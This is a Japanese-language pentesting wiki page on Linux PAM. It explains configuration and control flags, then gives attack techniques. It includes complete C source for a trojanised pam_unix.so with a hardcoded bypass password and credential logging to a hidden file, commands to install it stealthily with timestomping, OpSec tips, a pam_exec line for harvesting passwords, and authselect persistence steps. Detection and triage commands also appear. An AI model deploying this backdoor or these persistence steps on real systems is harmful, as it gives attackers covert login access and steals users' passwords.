# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本情報

**PAM (Pluggable Authentication Modules)** は、**コンピューターサービスへのアクセスを試みるユーザーの本人確認を行い**、さまざまな基準に基づいてアクセスを制御するセキュリティ機構です。デジタルの門番のようなもので、許可されたユーザーだけが特定のサービスを利用できるようにし、システムの過負荷を防ぐために利用を制限する場合もあります。

#### 設定ファイル

- **Solaris** は従来の中央設定ファイル `/etc/pam.conf` をサポートしていますが、現在は `/etc/pam.d` 配下のサービス別ファイルが推奨されています。<sup>[[10]](#references)</sup>
- **Linux systems** ではディレクトリ方式が推奨されており、サービス固有の設定を `/etc/pam.d` 内に保存します。たとえば、login サービスの設定ファイルは `/etc/pam.d/login` にあります。<sup>[[1]](#references)</sup>

login サービスの PAM 設定例は次のようになります：

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM Management Realms**

これらの realm（管理グループ）には **auth**、**account**、**password**、**session** があり、それぞれ認証およびセッション管理プロセスの異なる側面を担当します。<sup>[[1]](#references)</sup>

- **Auth**: ユーザーの身元を検証します。多くの場合、パスワードの入力を求めます。
- **Account**: グループへの所属や時間帯による制限などの条件を確認し、アカウントを検証します。
- **Password**: 複雑さのチェックや辞書攻撃の防止など、パスワードの更新を管理します。
- **Session**: ディレクトリのマウントやリソース制限の設定など、サービスセッションの開始時または終了時の処理を管理します。

#### **PAM Module Controls**

制御フラグはモジュールが成功または失敗にどう応答するかを指定し、認証プロセス全体に影響します。以下のものがあります。<sup>[[1]](#references)</sup>

- **Required**: 必須モジュールが失敗すると、後続のすべてのモジュールをチェックした後に最終的な失敗となります。
- **Requisite**: 失敗すると、プロセスをただちに終了します。
- **Sufficient**: それ以前の `required` モジュールが失敗していなければ、成功時にただちに処理を返し、同じ管理グループ内の残りのモジュールをスキップします。
- **Optional**: スタック内にこのモジュールしかない場合に限り、失敗の原因となります。

#### 攻撃上重要なセマンティクス

PAMを分析または変更する際は、**ルールを挿入する場所**によって、どのスタックがそのルールを読み込むかが決まります。<sup>[[1]](#references)[[13]](#references)</sup>

- `include` と `substack` は他のファイルからルールを取り込むため、`sshd` を編集するとSSHだけに影響する場合があります。一方、`system-auth`、`common-auth`、その他の共有スタックを編集すると、複数のサービスに一度に影響する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>
- PAMは `[success=1 default=ignore]` のような角括弧付きの制御指定にも対応しています。これを悪用すると、`pam_unix.so` を目立つ形で置き換えずに、カスタムチェックの成功後に1つ以上のモジュールを**スキップ**できます。<sup>[[1]](#references)</sup>
- `module-path` は**絶対パス**（`/usr/lib/security/pam_custom.so`）でも、PAMモジュールのデフォルトディレクトリからの**相対パス**でも指定できます。最近のLinuxシステムで実際に使われるディレクトリは、`/lib/security`、`/lib64/security`、`/usr/lib/security`、または `/usr/lib/x86_64-linux-gnu/security` のようなマルチアーキテクチャ用パスであることがよくあります。<sup>[[1]](#references)[[14]](#references)</sup>

オペレーター向けの要点: 変更を加える前に、必ず**サービスの全体的な依存関係**を把握してください。たとえば、一部のディストリビューションでは `sshd -> password-auth -> system-auth`、別のディストリビューションでは `sshd -> system-remote-login -> system-login -> system-auth` となっており、同じ1行の implant でも意図した範囲を大きく超えて影響する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>

カスタムの `auth` モジュールは、アカウントのパスワード入力後に `sudo` へ対話型のチャレンジを追加する場合があります。チャレンジを手動で確認する前に、実際に有効な `/etc/pam.d/sudo` スタック、取り込まれるポリシー、モジュール引数、参照されるローカルデータファイルのアクセス権を調べてください。チャレンジ用の単語リストが読み取り可能であるだけでは、パスワードチェックを回避できず、sudoersの権限も作成されません。特権への移行には、正しいアカウント認証、すべての必須PAMステップの完了、root権限で実行可能なsudoルールが引き続き必要です。無人の列挙でチャレンジを発生させないでください。

旧版Ubuntuの [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) については、実際の `libpam-modules` ビルドと、ログインサービスが影響を受けるsessionモジュールを呼び出すかどうかを確認してください。Ubuntuは9.10向けに **1.1.0-2ubuntu1.1**、10.04 LTS向けに **1.1.1-2ubuntu5** で修正しました。他のリリースやベンダーによるバックポートについては、各パッケージを個別に評価する必要があります。報告された手法では、呼び出し元がホームディレクトリの `.cache` をシンボリックリンクに置き換えてからPAMログインを実行すると、旧モジュールが保護対象の所有者を変更しました。`.cache` エントリ、`pam_motd.so` の行、古いカーネルバージョンだけでは、脆弱性の存在は確認できません。ファイルを置き換えたりログインを開始したりせずに、ホームディレクトリを制御できるか、有効なモジュールのバージョン、ログイン経路の有無、シンボリックリンクの扱い、対象のアクセス権を確認してください。[Ubuntuのセキュリティ告知](https://ubuntu.com/security/notices/USN-959-1)を参照してください。

#### Example Scenario

複数のauthモジュールを使う構成では、処理は厳密な順序で進みます。`pam_securetty` モジュールがログイン端末を許可されていないと判定すると、rootログインはブロックされますが、モジュールのステータスが「required」であるため、すべてのモジュールの処理は続行されます。`pam_env` は環境変数を設定し、ユーザーの利便性を高める場合があります。`pam_ldap` と `pam_unix` は連携してユーザーを認証し、`pam_unix` は以前に入力されたパスワードを使用しようとすることで、認証の効率と柔軟性を高めます。<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in a service stack

`pam_permit.so` はPAMチェックに成功を返します。権限の低いユーザーがサービスで実際に有効なPAMポリシーを変更できる場合、認証スタックを途中で終了させる制御フラグとともにこれを挿入すると、そのサービスのパスワードチェックを取り除ける可能性があります。`sudo` については、影響を受けるサービスを判断する前に、`/etc/pam.d/sudo` と、そこから取り込まれる `common-auth` または `system-auth` ファイルを確認してください。PAM認証のバイパスによって、新しいsudoersルールが付与されるわけではありません。ユーザーは引き続き、要求されたコマンドを実行する権限を持っている必要があります。単一の `sufficient pam_permit.so` 行が常に成功すると決めつけず、ルールの順序と、それ以前の `required` モジュールの失敗を確認してください。

## Backdooring PAM – Hooking `pam_unix.so`

重要度の高いLinux環境で使われる古典的な永続化の手口に、**正規のPAMライブラリをトロイの木馬化した差し替え用ファイルと入れ替える**方法があります。PAMスタックが `pam_unix.so` を読み込むホストでは、SSHまたはコンソールでの認証時に、その `pam_sm_authenticate()` エントリーポイントが呼び出される可能性があります。悪意のある差し替えファイルは、認証情報を取得したり、*magic* パスワードによるバイパスを実装したりできます。<sup>[[2]](#references)[[11]](#references)</sup>

### コンパイル早見表
以下のスケッチでは、Linux-PAMの `pam_sm_authenticate()` サービスエントリーポイントと、認証トークンにアクセスするための `pam_get_authtok()` を使用します。<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

コンパイルしてステルス置換します（置換/timestompの手法はUnit 42が記録しています）。wrapperにハードコードされたバックアップパスと、以下のコマンドの両方を、対象の実際のPAMモジュールディレクトリに合わせて変更してください。<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec Tips
1. **アトミック上書き** – 完全なライブラリを一時ファイルに書き込み、配置先に rename することで、認証モジュールが中途半端な状態で書き込まれるのを防ぎます。
2. Unit 42 の AuthDoor 分析では `/usr/bin/.dbus.log` のようなパスが確認されており、ハンティングに役立つ指標でもあります。<sup>[[2]](#references)</sup>
3. PAM stack が想定するエントリポイント（例: `pam_sm_authenticate`、`pam_sm_setcred`）を維持し、ほかの管理操作が引き続き動作するようにします。<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
パッケージの整合性チェックでは、RPM はインストール済みファイルのメタデータを検証し、`debsums -s` はチェックサムエラーを報告します。また、トリアージのブロック内にある `dpkg -S` はパッケージの所有者を照会します。audit watch の構文は、パスへの書き込みと属性変更を記録します。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` の MD5/SHA256 をディストリビューションのパッケージと比較します。
* 手動でハッシュを計算せずに置き換えられたライブラリを見つけるには、`rpm -V pam` または `debsums -s libpam-modules` を実行します。
* `/lib/security/` 配下に、誰でも書き込み可能なファイルや不自然な所有権がないか確認します。
* `auditd` ルール: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`
* PAM 設定内で予期しないモジュールを grep します: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`

この `pam_` grep では、別の `.so` ベース名を持つカスタムモジュールを検出できません。`/etc/pam.d`（および使用されている場合は `/etc/pam.conf`）にある**有効な** `auth`、`account`、`password`、`session` の行を確認し、control flag と、含まれている stack も調べてください。通常のパスワードチェックより前に見慣れないモジュールが `auth sufficient` として配置されている場合は、パッケージの所有権とバイナリを調べる必要があります。[PAM の control 構文](https://man7.org/linux/man-pages/man5/pam.d.5.html)では、認証に成功すると stack のその部分を早期に終了させることができます。モジュール名、不自然なタイムスタンプ、または `nodelay` オプションだけでは、bypass の証拠にはなりません。動作から timing leak が疑われる場合は、実装とサービスへの到達性をまず調査してください。通常の列挙で認証の推測を繰り返し送信しないでください。

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### `pam_exec`を悪用したpersistence
`pam_unix.so`を置き換える代わりに、`/etc/pam.d/sshd`に`pam_exec`の行を追加する方法もあります。これにより、該当するPAM行に到達した呼び出しでヘルパーが実行され、通常のスタックはそのまま維持されます。<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は、`PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY`、`PAM_TYPE` などの環境変数で PAM メタデータを受け取ります。`expose_authtok` を指定すると、ヘルパーは `auth` または `password` フェーズ中に、`stdin` からパスワードを最大 `PAM_MAX_RESP_SIZE` バイト読み取れます。ヘルパーを実 UID ではなく実効 UID で実行するには、`seteuid` を追加します。<sup>[[4]](#references)</sup>

`pam_exec` でドキュメント化されているモジュールタイプと `type=` フィルターに関する実用上の注意事項は次のとおりです。<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` は、ソケットの再オープンやデタッチされたデーモンの起動などの**ログイン後の処理**に適しています。
- `auth optional pam_exec.so quiet expose_authtok ...` は、セッションが開く前に実行されるため、**認証情報の取得**で通常使われます。
- `type=session` または `type=auth` を使うと、特定の PAM フェーズに実行を限定し、不要な二重実行を避けられます。

権限を確認する際は、現在のユーザーが書き込める絶対パスの `pam_exec.so` ヘルパーは、ファイルに追記専用属性（`a`）が設定されていても候補になります。[この属性は追記を許可するため](https://man7.org/linux/man-pages/man1/chattr.1.html)、シェルスクリプトの後続の動作を変更できる場合があります。まず、PAM サービスとイベントが実際にその行に到達すること、ヘルパーと親パスが信頼できること、コマンドがより高い権限の ID で実行されることを確認してください。[`seteuid` は、どの PAM UID が使われるかを変更します](https://man7.org/linux/man-pages/man8/pam_exec.8.html)。書き込み可能なファイルや `lsattr` の結果だけでは、特権実行の証明にはなりません。

### ディストリビューションのツールを経由して永続化する: `authselect`

`authselect` を使用する RHEL および Fedora 系システムでは、`/etc/pam.d/system-auth` や `/etc/pam.d/password-auth` などの生成ファイルを直接編集しても、**`authselect` によって上書きされる**ことがあります。永続化するには、通常、`/etc/authselect/custom/<profile>/` にある有効なカスタムプロファイルを変更してから、再選択します。<sup>[[5]](#references)[[19]](#references)</sup>

root 権限がある場合の一般的な手順:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

これは攻撃とトリアージの両方で重要です。`/etc/pam.d/system-auth` に `Generated by authselect` と `Do not modify this file manually` というバナーが含まれている場合、実際の永続化ポイントは `/etc/pam.d/` ではなく `/etc/authselect/custom/` にある可能性があります。<sup>[[5]](#references)</sup>

### 最近実際に確認されたtradecraft

2025年に報告された **Plague** Linux backdoorは、同じ基本的なアイデアをさらに発展させたものでした。悪意あるPAMコンポーネントに**静的バイパスパスワード**を組み込み、SSH関連の環境変数とシェル履歴（`HISTFILE=/dev/null`）を消去して、ログイン後のセッション痕跡を減らします。<sup>[[3]](#references)</sup> これは有用なハンティングパターンです。backdoorのロジックはPAM内に存在し、ステルス化の痕跡は認証が成功した**後にのみ**現れる可能性があるためです。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [秘密工作員のプレイブック：グローバル通信ネットワークへの侵入 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague：新たに発見されたLinux向けPAMベースのbackdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselectを使用したユーザー認証の設定 - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debianマニュアルページ](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debianマニュアルページ](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4での認証管理](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [システムレベル認証ガイド - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntuパッケージのファイル一覧：libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debianマニュアルページ](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAMマニュアル](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [変更点/Authselectを必須にする - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
